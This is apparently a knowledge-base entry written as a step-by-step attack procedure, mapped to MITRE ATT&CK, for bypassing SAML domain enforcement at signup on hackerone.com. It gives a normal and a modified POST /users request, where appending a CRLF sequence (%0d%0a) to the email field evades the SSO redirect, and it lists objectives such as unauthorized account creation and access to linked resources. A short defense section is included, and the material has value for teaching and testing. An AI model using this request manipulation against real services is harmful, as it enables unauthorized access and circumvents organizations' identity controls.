---
tags:
  - authentication-bypass
  - saml
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/normal-signup-post-request]]'
  - '[[commands/modified-signup-post-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b0958d60-b0f4-4c18-8e54-cce5a3ceb72b
created_at: '2025-12-13T09:01:26.723Z'
updated_at: '2025-12-13T09:01:26.723Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass SAML Signup Enforcement

## Summary

This procedure exploits improper input normalization in the signup process by appending control characters to bypass SAML domain enforcement, allowing creation of accounts with restricted emails.

## Description

The attack targets the POST /users endpoint on hackerone.com, where trailing %0d%0a in the email parameter evades checks, leading to unauthorized account creation and potential access to linked services. It requires intercepting HTTP requests and assumes access to the verification email.

## Requirements

1. Access to Burp Suite for request interception
2. Internet access to hackerone.com
3. Ability to receive and verify the confirmation email

## Defense

Defensive measures and detection strategies:

- Implement strict input normalization and stripping of control characters in email fields
- Monitor for anomalous signup requests with unusual characters

## Objectives

1. Create unauthorized account with restricted domain
2. Bypass SSO redirect
3. Enable further access to linked resources

## Instructions

### Step 1: Observe Normal Signup Behavior

**Context**: Attempt a standard signup to confirm SAML enforcement.

**Command** ([[commands/normal-signup-post-request]]):
```bash
POST /users HTTP/1.1
Host: hackerone.com
...
user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

> This triggers a redirect to SSO for restricted domains, with output {"redirect_path":"/users/saml/sign_in?email=email%40example.com"}.

### Step 2: Modify Request to Bypass Enforcement

**Context**: Intercept and alter the request to append control characters.

**Command** ([[commands/modified-signup-post-request]]):
```bash
POST /users HTTP/1.1
Host: hackerone.com
...
user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com%0d%0a&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

> This bypasses the check, resulting in {"redirect_path":"/users/sign_in","errors":{}} and account creation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/normal-signup-post-request]]
- [[commands/modified-signup-post-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- authentication-bypass
- saml
